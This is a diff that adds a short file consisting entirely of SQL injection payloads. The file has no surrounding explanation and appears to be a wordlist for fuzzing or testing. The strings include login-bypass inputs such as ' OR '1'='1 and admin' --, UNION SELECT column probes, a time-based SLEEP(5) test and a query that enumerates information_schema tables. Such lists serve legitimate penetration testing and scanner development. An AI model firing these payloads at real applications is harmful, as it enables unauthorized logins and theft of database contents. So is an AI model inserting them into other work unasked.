@@ -1,0 +1,14 @@
+' OR '1'='1
+' OR '1'='1' -- 
+' OR '1'='1' #
+' OR 1=1 --
+' OR 1=1 #
+' UNION SELECT NULL, NULL, NULL --
+admin' --
+admin' #
+' OR '' = '
+' OR 1=1 LIMIT 1 OFFSET 1 --
+" OR 1=1--
+' OR 1=1 AND SLEEP(5) --
+' UNION SELECT 1,2,3,md5(1)--
+' OR (SELECT COUNT(*) FROM information_schema.tables) > 0 --
